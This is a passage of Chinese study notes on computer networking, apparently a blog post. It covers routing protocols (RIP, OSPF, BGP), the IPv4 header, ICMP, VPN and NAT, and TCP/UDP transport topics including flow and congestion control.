System），例如，一个较大的因特网服务提供商（电信）就可以划分成一个自治系统，对于自治系统内部和自治系统外部，分别采用不同类别的路由选择协议进行路由选择。\n\n因特网采用分层次的路由选择协议，自治系统之间称为域间路由选择，自治系统内称为域内路由选择。自治系统之间称为外部网关协议EGP(也可称为外部路由协议ERP)，自治系统内称为内部网关协议IGP(也可称为内部路由协议IRP)。此处的网关就是路由器，只不过是路由器早期的名称。\n\n注意：路由协议只是一个名称，并不是一个具体的协议。\n\n{% asset_img 4.6.1.png 路由协议 %}\n\n#### 4.6.1.1 常见的路由选择协议\n\n{% asset_img 4.6.2.png 常见的路由选择协议 %}\n\n#### 4.6.1.2 路由器的基本结构\n\n路由器是具有多个输入端口和输出端口的专用计算机，其任务是转发分组。\n\n路由器主要由两部分组成：\n\n- 路由选择部分：\n  核心构件是路由选择处理机，根据路由器选择协议，周期性的和其他路由器进行路由信息交互，构建路由表。\n- 分组转发部分：\n  分组转发部分主要有三部分组成：交换结构、一组输入端口和一组输出端口。\n\n{% asset_img 4.6.3.png 路由器的基本结构 %}\n\n路由表与转发表：\n\n- 路由表一般仅包含从目的网络到下一跳的映射。\n- 路由表需要对网络拓扑变化的计算最优化。\n- 转发表是从路由表得出的。\n- 转发表的结构应当使查找过程最优化。\n- ps：一般不严格区分路由表和转发表。\n\n路由器还具有输入缓冲区、输出缓冲区。输入缓冲区用于存储新进入路由器但还来不及处理的分组。输出缓冲区用来存储已经处理完毕但是还来不及发送的分组。\n\n#### 4.6.1.3 路由器的基本工作过程\n\n1. 某IP数据报进入路由器输入端口后处理过程：①物理层将其信号转变成比特流，送交数据链路层处理；②数据链路层从比特流中识别出帧，去掉帧头和帧尾后送交网络层处理；③网络层中接收后判断其分组类型，若是普通的数据分组，会将其发送到分组处理机中；若是路由之间交换路由信息的路由报文，则会将该路由报文转发给路由处理机，路由处理机根据分组报文更新自己的路由表。\n2. 某数据报进入分组处理机构后处理过程：分组处理机会根据其分组首部中的目的地址进行查表转发，若找不到目的地址，则丢弃该分组，否则转发到下一个对应端口。\n3. 某IP数据报进入路由器输出端口后处理过程：①输出端口网络层会更新数据分组首部中某些字段的值，例如将数据分组生存时间(TTL)-1，然后送交数据链路层处理；②数据链路层封装成帧，交给物理层处理；③物理层将帧转为对应的比特流，在转换成电信号进行发送。\n\n### 4.6.2 路由信息协议(RIP)的基本工作原理\n\n{% asset_img 4.6.4.png RIP概述 %}\n\nRIP协议认为好的路由就是“距离短”的路由，就是所通过路由器数量最少的路由。\n\n当到达同一目的网络有多条 “距离相等” 的路由时，可以进行等价负载均衡，就是将通信量均衡地分布到多条等价的路由上。\n\nRIP包含以下三个要点：\n\n- 和谁交换信息：仅和相邻路由器交换信息\n- 交换什么信息：自己的路由表\n- 何时交换信息：周期性交换（例如每30秒）\n\n#### 4.6.2.1 RIP基本工作过程\n\n{% asset_img 4.6.5.png RIP概述 %}\n\n#### 4.6.2.2 RIP的路由条目的更新规则\n\n{% asset_img 4.6.6.png RIP的路由条目的更新规则 %}\n\n#### 4.6.2.3 RIP协议存在“坏消息传得慢”的问题\n\n{% asset_img 4.6.7.png RIP协议存在“坏消息传得慢”的问题 %}\n\n由于N1出现故障，R1路由器将N1的距离设置为16（16认为不可达）。\n\n\n此时R2根据以前RIP协议获得的路由器情况，发送更新请求给R1，而此时R1的更新情况还没发给R2。\n\n{% asset_img 4.6.8.png RIP协议存在“坏消息传得慢”的问题 %}\n\n此时R1的路由器表先收到R2的路由器表后会根据上面说的更新规则进行更新，将N1到R2的距离更新为3。此时数据就是被谣言误导的。此后，两路由器之间会一直以被误导的数据进行循环更新路由数据，直到双方距离达到16（认为不可达）时，才会选择放弃传输。\n\n在此过程中，就会出现路由环路，导致路由器间被占用长达数分钟的时间。\n\n“坏消息传播得慢” 又称为路由环路或距离无穷计数问题，这是距离向量算法的一个固有问题。可以采取多种措施减少出现该问题的概率或减小该问题带来的危害。比如：\n\n- 限制最大路径距离为15（16表示不可达）\n- 当路由表发生变化时就立即发送更新报文（即 “触发更新”），而不仅是周期性发送\n- 让路由器记录收到某特定路由信息的接口，而不让同一路由信息再通过此接口向反方向传送（即 “水平分割”）\n\n但是，就算采取了上述措施，由于向量计算算法的本质决定，“坏消息传得慢”问题还是有可能会出现。\n\n### 4.6.3 开放最短路径优先(OSPF)的基本工作原理\n\n- 开放最短路径优先OSPF，是为了克服RIP的缺点在1989年开发出来的。\n  - “开放”表明OSPF协议不是受某一家厂商控制，而是公开发表的\n  - “最短路径优先”，是因为使用了迪杰斯特拉的最短路径算法SPF（最小生成树）\n\n- OSPF是基于链路状态的，而不是像RIP那样基于距离向量的。\n- OSPF采用SPF算法计算路由，从算法上保证了不会产生路由环路。\n- OSPF不限制网络规模，更新效率高，收敛速度快。\n- 链路状态是指本路由器都和哪些路由器相连，以及相应链路的代价。\n  - 代价用来表示费用、距离、时延、带宽等等。代价的计算方法由网络管理人员来决定的，没有统一\n\n{% asset_img 4.6.9.png 计算邻居的代价 %}\n\n{% asset_img 4.6.10.png 判断邻居路由器不可达的方法 %}\n\n{% asset_img 4.6.11.png LSA概述 %}\n\n{% asset_img 4.6.12.png LSDB %}\n\n{% asset_img 4.6.13.png OSPF %}\n\n#### 4.6.3.1 五种OSPF分组类型\n\n1. 问候(Hello)分组：用来发现和维护邻居路由器的可达性\n2. 数据库描述(Database Description)分组：向邻居路由器给出自己的链路状态数据库中的所有链路状态项目的摘要信息\n3. 链路状态请求(Link State Request)分组：向邻居路由器请求发送某些链路状态项目的详细信息\n4. 链路状态更新(Link State Update)分组：路由器使用这种分组将其链路状态进行洪泛发送，即用洪泛法对全网更新链路状态\n5. 链路状态确认(Link State Acknowledgment)分组：这是对链路状态更新分组的确认分组\n\n#### 4.6.3.2 OSPF的基本工作过程\n\n{% asset_img 4.6.14.png OSPF的基本工作过程 %}\n\n主要可以看成三个部分：\n\n1. 通过发送问候分组建立和维护邻居关系\n\n2. 链路状态数据库同步：\n\n   先发送数据库描述分组，将自己链路状态数据库中的所有链路状态项目的摘要信息发送给邻居路由。\n\n   路由器发送自己缺失某些链路状态摘要信息中的详细信息，就会向相邻路由发送链路状态请求分组。\n\n   相邻路由器收到链路更新请求后会返回路由状态更新分组。\n\n   发送请求的网络收到更新分组后会返回确认分组，一次更新数据过程结束。\n\n3. 同步状态后的链路状态数据库同步：\n   在30分钟后或者链路状态发生变化后，会进行新的更新状态过程。\n\n#### 4.6.3.3 OSPF在多点接入网络路由器中邻居关系的建立\n\n{% asset_img 4.6.15.png OSPF邻居关系的建立 %}\n\n{% asset_img 4.6.16.png 划分区域 %}\n\n区域之间分为主干区域和区域。在图中可以看到有4种路由器：\n\n1. **区域内路由器(IR)**：只用于区域内通信。\n2. **区域边界路由器(ABR)**：用于区域间通信。\n3. **自治系统边界路由器(ASBR)**：用于和其他自治系统通信。\n4. **主干路由器(BBR)**：位于主干区域的路由器。\n\n使用分层次划分区域的方法，虽然使交换信息的种类变多了，也使OSPF协议更复杂了，但是能使区域内部交换信息量大大减少，使得OSPF能用于规模很大的自治系统中。\n\n### 4.6.4 边界网关协议(BGP)的基本工作原理\n\n{% asset_img 4.6.17.png 边界网关协议 %}\n\n自治系统之间的路由选择必须考虑相关策略(政治、经济、安全等)。BGP只能是力求寻找一条能够到达目的网络且比较好的路由(不能兜圈子)，而并非要寻找一条最佳路由。\n\n{% asset_img 4.6.18.png 边界网关协议 %}\n\n{% asset_img 4.6.19.png 边界网关协议 %}\n\n{% asset_img 4.6.20.png 边界网关协议 %}\n\n{% asset_img 4.6.21.png 边界网关协议 %}\n\n#### 4.6.4.1 四种BGP-4报文\n\n1. OPEN(打开)报文：用来与相邻的另一个BGP发言人建立关系，使通信初始化\n2. UPDATE(更新)报文：用来通告某一路由的信息，以及列出要撤销的多条路由\n3. KEEPALIVE(保活)报文：用来周期性地证实邻站的连通性\n4. NOTIFICATION(通知)报文：用来发送检测到的差错\n\nBGP刚刚运行时，BGP的邻站会交换整个BGP路由表，以后只需要在路由情况发生变化时更新有变化的部分。这样做对节省网络带宽和减少路由器的处理开销都有好处。\n\n{% asset_img 4.6.22.png 习题 %}\n\n## 4.7 IPv4数据报的首部格式\n\n{% asset_img 4.7.1.png IP数据报组成 %}\n\n在IP协议中分为两部分：\n\n- 固定部分：由20字节组成，是每个IP数据报都必须包含的部分。\n- 可变部分：可选字段，由40个字节组成，用来增加IP数据报的功能。\n\n\nIP数据报的首部的每一行都由32个比特（4个字节）组成。在图中的每个小格子称为字段或者域。每个字段或者某个字段的组合用来表示IP协议的相关功能。\n\n**相关字段功能解释**：\n\n- 版本：占4比特，表示IP协议的版本。\n\n  通信双方使用的IP协议的版本必须一致，目前广泛使用的IP协议版本号为4(即IPv4)。\n\n- 首部长度：占4比特，表示IP数据报首部的长度。\n\n  该字段的取值以4字节为单位。\n\n  最小十进制取值为5，表示IP数据报首部只有20字节固定部分；最大十进制取值为15，表示IP数据报首部包含20字节固定部分和最大40字节可变部分。\n\n- 区分服务：占8比特，用来获得更好的服务。\n\n  该字段在旧标准中叫作服务类型，但实际上一直没有被使用过。\n\n  只有在使用区分服务时，该字段才起作用。利用该字段的不同数值可提供不同等级的服务质量。一般情况下都不使用该字段。\n\n- 总长度：占16比特，表示IP数据报的总长度(首部+数据载荷)。\n\n  最大取值为十进制的65535，以字节为单位。\n\n- 标识：占16比特。\n\n  属于同一个数据报的各分片数据报应该具有相同的标识。\n\n  IP软件维持一个计数器，每产生一个数据报，计数器值加1，并将此值赋给标识字段。\n\n- 标志：占3比特，各比特含义如下：\n\n  ​\t\t\tDF位：1表示不允许分片；0表示允许分片\n\n  ​\t\t\tMF位：1表示“后面还有分片”，0表示“这是最后一个分片”\n\n  ​\t\t\t保留位：必须为0\n\n- 片偏移：占13比特，指出分片数据报的数据载荷部分偏移其在原数据报的位置有多少个单位。\n\n  片偏移以8个字节为单位。\n\n- 生存时间TTL：占8比特。\n\n  最初以秒为单位，最大生存周期为255秒。路由器转发IP数据报时，将IP数据报首部中的该字段的值减去IP数据报在本路由器上所耗费的时间，若不为0就转发，否则丢弃。\n\n  现在以“跳数”为单位，路由器转发IP数据报时，将IP数据报首部中的该字段的值减1，若不为0就转发，否则丢弃。\n\n- 协议：占8比特，指明IPv4数据报的数据部分是何种协议数据单元。\n\n  常用的一些协议和相应的协议字段值如下：\n\n  | 协议名称   | ICMP | IGMP | TCP  | UDP  | IPv6 | OSPF |\n  | ---------- | ---- | ---- | ---- | ---- | ---- | ---- |\n  | 协议字段值 | 1    | 2    | 6    | 17   | 41   | 89   |\n\n- 首部校验和：占16比特，用来检测首部在传输过程中是否出现差错。比CRC校验码简单，称为因特网校验和。\n\n  IP数据报每经过一个路由器，路由器都要重新计算首部校验和，因为某些字段(生存时间、标志、片偏移等)的取值可能发生变化。\n\n  由于IP层本身并不提供可靠传输的服务，并且计算首部校验和是一项耗时的操作，因此在IPv6中，路由器不再计算首部校验和，从而更快转发IP数据报。\n\n- 源IP地址和目的IP地址：各占32比特，用来填写发送该IP数据报的源主机的IP地址和接收该IP数据报的目的主机的IP地址。\n\n- 可选字段：长度从1个字节到40个字节不等，用来支持排错、测量及安全等措施。\n\n  可选字段增加了IP数据报的功能，但这同时也使得IP数据报的首部长度成为可变的。这就增加了每一个路由器处理IP数据报的开销。实际上可选字段很少被使用。\n\n- 填充字段：因为IP地址首部的可选字段的长度为1个字节到40个字节不等，为了确保首部长度整体为4字节的倍数，因此需要用首部填充字段进行填充。\n\n### 4.7.1 数据载荷\n\n{% asset_img 4.7.2.png 数据载荷 %}\n\n### 4.7.2 IP数据报分片\n\n标识、标志、片偏移这三个字段共同用于数据报分片，此时就引起了数据报分片的概念。\n\n简单来说，数据报分片就是数据报长度超过最大传输单元(MTU)时，将数据报进行分割的操作。\n\n数据报长度超过最大传输单元(MTU)时将无法封装成帧，因此就将原IP数据报进行分片，使其成为更小的IP数据报。再逐个分配IP数据报封装成帧进行递交给物理层处理。\n\n{% asset_img 4.7.3.png IP数据报分片 %}\n\n{% asset_img 4.7.4.png 例子 %}\n\n{% asset_img 4.7.5.png 例子 %}\n\n{% asset_img 4.7.7.png 习题一 %}\n\n### 4.7.3 TTL防止路由环路\n\n{% asset_img 4.7.6.png TTL防止路由环路 %}\n\n{% asset_img 4.7.8.png 习题二 %}\n\n{% asset_img 4.7.9.png 习题二 %}\n\n{% asset_img 4.7.10.png 习题二 %}\n\n## 4.8 网际控制报文协议(ICMP)\n\n- ICMP是为了更有效地转发IP数据报和提高交付成功的机会，在网际层使用了网际控制报文协议(Internet Control Message Protocol，ICMP)。\n- 主机或路由器使用ICMP来发送差错报文和询问报文。\n- ICMP报文被封装在IP数据报中发送。\n\n### 4.8.1 ICMP中的差错报告报文\n\nICMP中差错报告报文共有5种，分别是：终点不可达、源点抑制、时间超过、参数问题、改变路由(重定向)。\n\n终点不可达：\n\n{% asset_img 4.8.1.png 终点不可达 %}\n\n源点抑制：\n\n{% asset_img 4.8.3.png 源点抑制 %}\n\n时间超过：\n\n{% asset_img 4.8.2.png 时间超过 %}\n\n另外，当终点在预先规定的时间内不能收到一个数据报的全部数据报片时，就把已收到的数据报片都丢弃，也会向源点发送时间超过报文。\n\n参数问题：\n\n{% asset_img 4.8.4.png 参数问题 %}\n\n改变路由：\n\n{% asset_img 4.8.5.png 改变路由 %}\n\n以下情况不应发送ICMP差错报告报文：\n\n- 对ICMP差错报告报文不再发送ICMP差错报告报文\n- 对第一个分片的数据报片的所有后续数据报片都不发送ICMP差错报告报文\n- 对具有多播地址的数据报都不发送ICMP差错报告报文\n- 对具有特殊地址(如127.0.0.0或0.0.0.0)的数据报不发送ICMP差错报告报文\n\n### 4.8.2 ICMP中的询问报文\n\n{% asset_img 4.8.6.png 询问报文 %}\n\n### 4.8.3 ICMP的应用\n\n#### 4.8.3.1 分组网间探测PING\n\n分组网间探测（Packet InterNet Groper，PING）：\n\n- 用来测试主机或路由器之间的连通性\n- 应用层直接使用网际层的ICMP(没有经过运输层的TCP或UDP)\n- 使用ICMP回送请求和回答报文\n\n#### 4.8.3.2 跟踪路由traceroute\n\n- 用来测试IP数据报从源主机到达目的主机要经过哪些路由器\n- Windows版本\n  - tracert命令\n  - 应用层直接使用网际层ICMP\n  - 使用了ICMP回送请求和回答报文以及差错报告报文\n- Unix版本\n  - traceroute命令\n  - 在运输层使用UDP协议\n  - 仅使用ICMP差错报告报文\n\n跟踪路由traceroute实现原理：简单来说，就是先发送一个TTL = 1的报文，当TTL到达第一个路由器后TTL变为0，此时路由器会回送时间超过差错报文，此时就能知道第一个路由信息。此时源主机再发送TTL = 2 的报文，当TTL到达第二个路由器后TTL变为0，此时路由器会回送时间超过差错报文，此时就能够知道第二个路由的地址。如此反复，直到到达最后一个路由。\n\n{% asset_img 4.8.7.png traceroute实现原理 %}\n\n{% asset_img 4.8.8.png traceroute实现原理 %}\n\n{% asset_img 4.8.9.png traceroute实现原理 %}\n\n## 4.9 虚拟专用网VPN和网络地址转换NAT\n\n### 4.9.1 虚拟专用网VPN(Virtual Private Network)\n\n{% asset_img 4.9.1.png 如何让两个专用网络进行通信 %}\n\n第一种方式就是采用电信公司的通信线路，这种方法简单方便，但是租金太贵。\n\n第二种方式就是将两个网络通过因特网进行通信，但是他们之间的IP地址又如何分配？\n\n首先明确一个概念：\n\n- 利用公用的因特网作为本机构各专用网之间的通信载体，这样的专用网称为虚拟专用网（VPN）\n\n- 由于IPv4地址的紧缺，一个机构在因特网上能够申请到的IPv4的地址数量往往是小于本机构所拥有得到主机数量。因此，虚拟专用网中个主机所分配的地址应该是本机构可自由分配的专用地址，而不是需要申请的、在因特网上使用的公有地址。\n\n- 在IPv4地址空间中就规定了这样的特殊地址分配方案：\n\n  > 专用(私有)地址：\n  >\n  > 10.0.0.0~10.255.255.255(10/8地址块)\n  >\n  > 172.16.0.0~172.31.255.255(172.16/12地址块)\n  >\n  > 192.168.0.0~192.168.255.255(192.168/16地址块)\n\n  这些地址可以在本地自由分配，不会在因特网中造成冲突。私有地址只能用作本地地址，不能用作全球地址。\n\n本地地址：仅在机构内部使用的 IP 地址，可以由本机构自行分配，而不需要向互联网的管理机构申请。\n\n全球地址：全球唯一的 IP 地址，必须向互联网的管理机构申请。\n\n在因特网中的所有路由器，对目的地址是私有地址的IP数据报一律不进行转发。\n\n为了使两个部门的网络能够跟因特网连通，因此还需要两个路由器具有合法的全球IP地址，这样才能实现通过因特网通信。\n\n{% asset_img 4.9.2.png 通过因特网进行通信 %}\n\n虽然两个专用网内的主机间发送的数据报是通过了公用的因特网，但在逻辑上就好像是在本机构的专用网上传送一样。数据报在因特网中可能要经过多个网络和路由器，但从逻辑上看，R1和R2之间好像是一条直通的点对点链路，因此这种通信方式又称为IP隧道技术。\n\n{% asset_img 4.9.3.png IP隧道技术 %}\n\n如上图所示，同一机构内不同部门的内部网络所构成的虚拟专用网VPN又称为内联网VPN。\n\n有时一个机构的VPN需要有某些外部机构(通常就是合作伙伴)参加进来，这样的VPN就称为外联网VPN。\n\n在外地工作的员工需要访问公司内部的专用网络时，只要在任何地点接入到因特网，运行驻留在员工PC中的VPN软件，在员工的PC和公司的主机之间建立VPN隧道，即可访问专用网络中的资源，这种VPN称为远程接入VPN。\n\n### 4.9.2 网络地址转换NAT(Network Address Translation)\n\n虽然因特网采用了无分类编址方式来减缓IPv4地址空间耗尽的速度，但由于因特网用户数目的激增，特别是大量小型办公室网络和家庭网络接入因特网的需求不断增加，IPv4地址空间即将面临耗尽的危险仍然没有解除。\n\n1994年提出了一种网络地址转换NAT的方法再次缓解了IPv4地址空间即将耗尽的问题。NAT能使大量使用内部专用地址的专用网络用户共享少量外部全球地址来访问因特网上的主机和资源。\n\n例如使用私有地址的主机要给因特网上使用全球IP地址的主机发送IP数据报：\n\n{% asset_img 4.9.4.png 私有地址给全球地址发送数据报 %}\n\n因特网上的全球IP地址主机给源主机发回数据报：\n\n{% asset_img 4.9.5.png 全球地址给私有地址发送数据报 %}\n\nNAT路由器接收到数据报后，根据首部的目的地址，查找NAT转换表后进行转换，转换成目的主机本地地址后进行传输。\n\n当专用网中的这两台使用私有地址的主机都要给因特网使用全球地址的另一台主机发送数据报时，在NAT路由器的NAT转换表中就会产生两条记录，分别记录两个私有地址与全球地址的对应关系。\n\n{% asset_img 4.9.6.png 私有地址给全球地址发送数据报 %}\n\n该转换方法存在一个问题：如果NAT路由器具有N个全球IP地址，那么至多只能有N个内网主机能够同时和因特网上的主机通信。\n\n解决方法：由于绝大多数的网络应用都是使用运输层协议TCP或UDP来传送数据，因此可以利用运输层的端口号和IP地址一起进行转换。这样，用一个全球IP地址就可以使多个拥有本地地址的主机同时和因特网上的主机进行通信。这种将端口号和IP地址一起进行转换的技术叫作网络地址与端口号转换NAPT(Network Address and Port Translation)。\n\n{% asset_img 4.9.7.png 采用NAPT解决 %}\n\n{% asset_img 4.9.8.png 通信不能由外网主机首先发起 %}\n\n对于一些P2P网络应用，需要外网主机主动与内网主机进行通信，在通过NAT时会遇到问题，需要网络应用自己使用一些特殊的NAT穿越技术来解决问题。另外，由于NAT对外网屏蔽了内网主机的网络地址，能为内网的主机提供一定的安全保护。\n\n# 5. 运输层\n\n## 5.1 运输层概述\n\n{% asset_img 5.1.1.png 引入 %}\n\n{% asset_img 5.1.2.png 引入 %}\n\n假设进程1与进程4之间进行基于网络的通信，它们通信的简单过程如下：\n\n1. 根据不同的进程，在运输层选择使用不同的端口\n2. 通过网络层及其下层来传输应用层报文\n3. 将收到的应用层报文到达接收方的运输层后，通过不同的端口，交付给应用层中相应的应用进程\n\nps：这里端口并不是指看得见、摸得着的物理端口，而是指用来区分不同应用进程的标识符。\n\n运输层向高层用户屏蔽了下面网络核心的细节(如网络拓扑、所采用的路由选择协议等)，它使应用进程看见的就好像是在两个运输层实体之间有一条端到端的逻辑通信信道。\n\n根据应用需求的不同，因特网的运输层为应用层提供了两种不同的运输协议，即面向连接的TCP和无连接的UDP。\n\n## 5.2 运输层端口号、复用和分用的概念\n\n- 在操作系统中，运行在计算机上的进程使用进程标识符PID来标志，但是因特网上的计算机并不是使用统一的操作系统，不同的操作系统使用不同格式的进程标识符。\n- 为了使运行不同系统的计算机的应用进程之间能够进行网络通信，就必须使用统一的方法来对TCP/IP体系的应用进程进行标识。\n- TCP/IP体系的运输层使用端口号来区分应用层的不同应用进程。\n- 端口号使用16比特表示，取值范围0~65535\n  - 熟知端口号：0~1023，IANA把这些端口号指派给了TCP/IP体系中最重要的一些应用协议，例如：FTP使用21/20，HTTP使用80，DNS使用53，HTTPS使用443\n  - 登记端口号：1024~49151，为没有熟知端口号的应用程序使用。使用这类端口号必须在IANA按照规定的手续登记，以防止重复。例如：Microsoft RDP微软远程桌面使用的端口是3389\n  - 短暂端口号：49152~65535，留给客户进程选择暂时使用。当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其它客户进程以后使用\n- 端口号只具有本地意义，即端口号只是为了标识本计算机应用层中的各进程，在因特网中，不同计算机中的相同端口号是没有联系的。\n\n### 5.2.1 发送方的复用和接收方的分用\n\n{% asset_img 5.2.1.png 发送方的复用和接收方的分用 %}\n\n发送方的某些应用进程所发送的不同应用报文，在运输层使用UDP协议进行封装，称为UDP复用；而另一些应用进程所发送的不同应用报文，在运输层使用TCP协议进行封装，称为TCP复用。\n\n### 5.2.2 TCP/IP体系的应用层常用协议所使用的运输层熟知端口号\n\n{% asset_img 5.2.2.png 熟知端口号 %}\n\n举例：运输层端口号\n\n{% asset_img 5.2.3.png 运输层端口号 %}\n\nDNS服务器：记录有某域名所对应的IP地址，在输入网页域名后，在hosts中找不到网页对应的IP地址时，就要通过DNS服务器获取域名对应的IP地址。\n\nWeb服务器：某域名的服务器，也就是前面几章所说的目的主机，在访问域名时IP数据报最终到达Web服务器，服务器进行响应。\n\n假如我们在浏览器中输入某域名访问，若此时在本地hosts缓存中有该域名的IP地址，直接发送带有目的地址的IP数据报；若计算机中没有该域名对应的IP地址，进行以下操作：\n\n1. 构建DNS请求报文，将该UDP请求封装成IP数据报通过以太网发送给DNS服务器。DNS服务器将UDP用户响应数据报封装在IP数据报中发送给用户。此时会将数据载荷，也就是DNS响应报文交给DNS进程进行处理，DNS进程将其响应报文进行解析，就可知道自己之前所请求的Web服务器的IP地址。\n\n   {% asset_img 5.2.4.png DNS请求与响应 %}\n\n2. 知道域名对应的IP地址后，可以开始构建HTTP请求，构建该请求需要TCP首部，封装在IP数据报中并发送该请求到Web服务器。Web服务器在接收到报文后会对其进行解析，在知道其端口为80后，会将数据载荷部分传输给本服务器中的HTTP服务器端进程进行解析。解析到内容后按照其要求查找首页内容，查找到后会给用户PC发送HTTP响应报文。\n\n   {% asset_img 5.2.5.png HTTP请求与响应 %}\n\n3. 用户PC接收到报文后进行解封，解封后发现目的端口是49152，也就是用户PC内的HTTP进程。因此将数据载荷（HTTP报文）传输给HTTP进程进行处理。HTTP进程解析到其内容后，在网页浏览器中进行展示。\n\n   {% asset_img 5.2.6.png 用户PC显示内容 %}\n\n## 5.3 UDP与TCP的对比\n\n1. 连接方式上：\n\n   {% asset_img 5.3.1.png UDP与TCP %}\n\n2. 传播方式上：\n\n   {% asset_img 5.3.2.png UDP与TCP %}\n\n3. 报文传输处理上：\n\n   {% asset_img 5.3.3.png UDP与TCP %}\n\n4. 给上层提供服务上：\n\n   {% asset_img 5.3.4.png UDP与TCP %}\n\n5. 协议首部对比上：\n\n   {% asset_img 5.3.5.png UDP与TCP %}\n\n| UDP(User Datagram Protocol)                            | TCP(Transmission Control Protocol)          |\n| ------------------------------------------------------ | ------------------------------------------- |\n| 无连接                                                 | 面向连接                                    |\n| 支持一对一、一对多、多对一、多对多交互通信             | 每一条TCP连接只能有两个端点，只能一对一通信 |\n| 对应用层交付的报文直接打包                             | 面向字节流                                  |\n| 尽最大努力交付，也就是不可靠；不使用流量控制和拥塞控制 | 可靠传输，使用流量控制和拥塞控制            |\n| 首部开销小，仅8个字节                                  | 首部最小20字节，最大60字节                  |\n\n## 5.4 TCP流量控制\n\n- 对于数据传输，我们希望传输得越快越好，但是若传输过快会导致接收方不够时间接收数据，造成数据丢失。\n- 流量控制(flow control)就是为了让发送方速率不要太快，要让接收方来得及接收。\n- 利用滑动窗口机制可以很方便地在TCP连接上实现对发送方的流量控制。\n\n{% asset_img 5.4.1.png TCP流量控制 %}\n\nACK = 1：表示是一个TCP确认字段\nack = 201：201编号以前的数据全部确认收到\nrwnd = 300：将接收窗口大小调整为300\n\n{% asset_img 5.4.2.png TCP流量控制 %}\n\n{% asset_img 5.4.3.png TCP流量控制 %}\n\n此时由于窗口为0，不再发送数据。\n\n{% asset_img 5.4.4.png TCP流量控制 %}\n\n为了解决这个问题，TCP为每一个连接设有一个持续计时器。在连接的一方接收到对方的零窗口通知后一段时间后，超时计时器到时，就会发送一个1字节的零窗口发送报文，在接收方接收到该信号后，就会通告自己的窗口大小。当知道窗口可以传输数据后，就会开始通信。\n\n{% asset_img 5.4.5.png TCP流量控制 %}\n\n上图如果零窗口探测报文在发送过程中如果丢失，还是能打破死锁局面。因为零窗口探测报文段也有重传计时器，重传计时器超时后，零窗口探测报文段会被重传。\n\n值得注意的是，TCP中规定不论接收方有没有空间，都必须接收发送方的3种报文：零窗口检测报文段、确认报文段、携带有紧急数据的报文段。\n\n## 5.5 TCP拥塞控制\n\n- 拥塞指的是某段时间内，若对网络中的某一资源的需求超过了该资源所能提供的可用部分，网络性能就要变坏。\n\n  - 在计算机网络中的资源包括链路容量（即带宽）、交换节点中的缓存和处理机等。\n- 若出现拥塞而不进行控制，整个网络的吞吐量将随输入负载的增大而下降。\n\n{% asset_img 5.5.1.png TCP拥塞控制 %}\n\n在图中，绿色指的是理想情况下不发生拥塞的情况，此时吞吐量与输入负载相等。当网络资源数被全部利用时，吞吐量不再增长。\n\n\n红色线指的是出现拥塞不进行处理，会导致吞吐量下降，直到吞吐量为零，产生死锁现象。\n\n\n蓝色线是实际的拥塞控制曲线，在出现拥塞后采用拥塞控制措施，使吞吐量保持在一定水平。\n\n拥塞控制的4种算法：慢开始(slow-start)、拥塞避免(congestion avoidance)、快重传(fast retransmit)、快恢复(fast recovery)。\n\n在讨论4种算法前，假定如下条件：\n\n1. 数据是单方向传送，而另一个方向只传送确认\n2. 接收方总是有足够大的缓存空间，因而发送方发送窗口的大小由网络的拥塞程度来决定\n3. 以最大报文段(MSS)的个数为讨论问题的单位，而不是以字节为单位\n\n{% asset_img 5.5.2.png TCP拥塞控制 %}\n\n### 5.5.1 慢开始与拥塞避免\n\n- 慢开始算法是用来确定网络的负载能力或拥塞程度。\n- 算法是实现是由小到大逐渐增大（以倍数增长）拥塞窗口数值。\n  以一次数据报文传输过程学习慢开始算法\n- 慢开始指的是一开始网络注入的报文段少，并不是指拥塞窗口cwnd的增长速度慢。\n\n{% asset_img 5.5.3.png 慢开始 %}\n\n拥塞窗口达到慢开始门限ssthresh后，慢开始算法使用阶段结束，开始拥塞避免算法阶段。\n\n- 拥塞避免算法让拥塞窗口 cwnd 缓慢地增大（每轮窗口大小+1），避免出现拥塞。\n- 在拥塞避免阶段，具有 “加法增大” (Additive Increase) 的特点。\n- 拥塞避免算法并不能完全避免拥塞，只是在拥塞避免阶段将容易拥塞的窗口控制为按线性规律增长，使网络比较不容易出现拥塞。\n\n{% asset_img 5.5.4.png 拥塞避免 %}\n\n循环重复此传输过程，若传输过程中部分报文段丢失，在重传计时器时间内没有收到确认报文(即重传计时器超时)，则判断网络很可能出现了拥塞。进行以下工作：\n\n1. 将ssthresh值更新为拥塞时cwnd值的一半\n2. 将cwnd值减少为1，重新开始执行慢开始算法\n\n{% asset_img 5.5.5.png 拥塞避免 %}\n\n### 5.5.2 快重传与快恢复\n\n{% asset_img 5.5.6.png 快重传与快恢复 %}\n\n- 采用快重传算法可以让发送方尽早知道发生了个别报文段的丢失。\n- 所谓快重传，就是使发送方尽快进行重传，而不是等超过重传计时器超时再重传。\n  - 要求接收方不要等待自己发送数据时才进行捎带确认，而是要立即发送确认。\n  - 即使收到了失序的报文段也要立即发出对已收到的报文段的重复确认。\n  - 发送方一旦收到了3个连续的重复确认，就将相应的报文段立即重传，而不是等该报文段的超时重传计时器超时再重传。\n  - 对于个别丢失的报文段，发送方不会出现超时重传，也就不会误认为出现了拥塞(进而降低拥塞窗口cwnd为1)。使用快重传可以使整个网络的吞吐量提高约20%。\n\n{% asset_img 5.5.7.png 快重传 %}\n\n- 发送方一旦收到3个重复确认，就知道现在只是丢失了个别的报文段。于是不启动慢开始算法，而执行快恢复算法。\n  - 发送方将慢开始门限ssthresh值和拥塞窗口cwnd值调整为当前窗口的一半，开始执行拥塞避免算法。\n  - 也有的快恢复实现是把快恢复开始时的拥塞窗口cwnd值再增大一些，即等于新的ssthresh+3。\n    - 既然发送方收到了3个重复的确认，就表明有3个数据报文段已经离开了网络；\n    - 这3个报文段不再消耗网络资源而是停留在接收方的接收缓存中；\n    - 可见现在网络中不是堆积了报文段而是减少了3个报文段，因此可以适当把拥塞窗口扩大些。\n\n{% asset_img 5.5.8.png 四种算法综合 %}\n\n## 5.6 TCP超时重传时间的选择\n\nTCP超时重传时间的选择是TCP最复杂的问题之一，若超时重传时间(RTO)比往返时间(RTT)短会导致不必要的重传，使网络负荷增大；若RTO比RTT过长会导致网络的空闲时间增大，降低了传输效率。因此，RTO的设置应该略大于往返时间(RTT)。但是此时又会出现一个问题，由于网络传输环境的不同，导致接下来的RTT是不确定的，如此应该如何认定RTO？\n\n{% asset_img 5.6.1.png TCP超时重传时间的选择 %}\n\n{% asset_img 5.6.2.png TCP超时重传时间的选择 %}\n\n{% asset_img 5.6.3.png TCP超时重传时间的选择 %}\n\n{% asset_img 